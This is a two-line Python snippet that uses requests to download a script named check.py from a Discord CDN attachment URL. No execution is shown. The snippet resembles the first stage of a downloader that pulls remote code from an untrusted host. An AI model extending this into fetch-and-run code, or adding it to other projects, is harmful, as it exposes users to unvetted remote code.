import requests

r = requests.get('https://cdn.discordapp.com/attachments/945789294168129536/1087384088387784865/check.py')